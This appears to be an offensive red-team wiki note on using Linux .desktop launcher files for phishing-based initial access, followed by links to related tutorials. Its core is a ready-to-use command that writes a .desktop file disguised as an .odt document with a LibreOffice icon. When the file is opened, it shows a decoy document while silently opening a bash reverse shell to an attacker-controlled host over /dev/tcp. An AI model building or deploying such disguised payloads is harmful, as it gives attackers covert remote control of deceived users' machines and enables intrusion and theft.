---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - linux
credits:
  - tokyoneon
---
# Manual

TODO:

shortcut to application (.desktop extension)
link to resource (.desktop extension)
submenu (.directory extension)

## Fake Document

```
$ cat > malicious_document.desktop << EOF
#!/usr/bin/env xdg-open

[Desktop Entry]
Encoding=UTF-8
Name=document.odt
Exec=libreoffice --writer $(pwd)/.real_document.odt; /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1 &
Terminal=false
Type=Application
Icon=libreoffice-writer
EOF
```

---
## References

### Backlinks

- [[Helpers|Helpers: Desktop Entries]]

### Null Byte

- [Null Byte: Pop a Reverse Shell with a Video File by Exploiting Popular Linux File Managers](https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078)

### DMCXBlue

- [DMCXBlue: Attachments - Desktop Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-attachment/attachments-desktop-files)

### Vicarius

- [Vicarius: Phishing Linux Users with Zero Detection!](https://www.vicarius.io/vsociety/posts/phishing-linux-users-with-zero-detection)